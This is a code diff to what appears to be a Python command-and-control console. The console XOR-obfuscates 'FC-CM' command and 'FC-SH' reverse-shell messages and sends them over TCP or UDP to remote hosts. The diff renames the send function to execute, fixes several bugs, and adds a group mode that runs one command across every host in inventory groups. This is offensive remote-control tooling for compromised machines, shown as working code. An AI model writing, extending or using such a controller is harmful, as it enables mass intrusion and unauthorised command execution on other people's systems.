@@ -63,7 +63,7 @@ groupparams = {
 }
 
 def getGroup():
-    key = groupparams("group")
+    key = groupparams["group"]
     loi = []
 
     if parsedConfig[key] == 'hosts':
@@ -102,17 +102,9 @@ def importConfig(op_1):
             parsedConfig[x] = "children"
             parsedConfig[x+":children"] = list(configItems[x].get('children'))
 
-    # iplist = setGroup('cloud') 
-    # print('cloud\n')
-    # if len(iplist) != 0 and verify():
-    #     for lst in iplist:
-    #         send(lst)
 
-    # setGroup('dc')
-    # print('dc\n')
-    # if len(iplist) != 0 and verify():
-    #     for lst in iplist:
-    #         send(lst)
+def print_groups():
+    pass
 
 
 def xor_encrypt(byte_msg, byte_key):
@@ -129,6 +121,8 @@ def print_help():
 
 def print_options(p):
     for item in p.keys():
+        if baseparams["mode"] == "group" and item == "rhost":
+            continue
         print(f"\n{item}: {p[item]}")
     print()
 
@@ -221,18 +215,20 @@ def interact(params):
             elif user_cmd == "options":
                 print_options(params)
             
-            elif user_cmd == "send":
+            elif user_cmd == "execute":
                 if baseparams["mode"] == "cmd" and verify(cmdparams):
                     plaintext = "FC-CM-{}\00".format(params["command"])
-                    send(plaintext, cmdparams)
+                    execute(plaintext, cmdparams)
                 elif baseparams["mode"] == "shell" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["lhost"]) 
-                    send(plaintext, shellparams)
+                    execute(plaintext, shellparams)
                 elif baseparams["mode"] == "group" and verify(groupparams):
-                    iplist = getGroup()
-                    for ip in iplist:
-                        groupparams["rhost"] = ip
-                        send(plaintext, groupparams)
+                    plaintext = "FC-CM-{}\00".format(params["command"])
+                    groupList = getGroup()
+                    for iplist in groupList:
+                        for ip in iplist:
+                            groupparams["rhost"] = ip
+                            execute(plaintext, groupparams)
                 else:
                     continue
             else:			
@@ -263,7 +259,7 @@ def verify(params):
         print('transport incorrect')
         params["transport"] == "tcp"
 
-    if params["rhost"] == "": # blank or is invalid ip
+    if baseparams["mode"] != "group" and params["rhost"] == "": # blank or is invalid ip
         print("rhost incorrect")
         passing = False
 
@@ -278,7 +274,7 @@ def verify(params):
     return passing
 
 
-def send(plaintext, params):
+def execute(plaintext, params):
     encrypted = xor_encrypt(plaintext.encode(), 0x10)
 
     if(params["transport"] == "udp"):
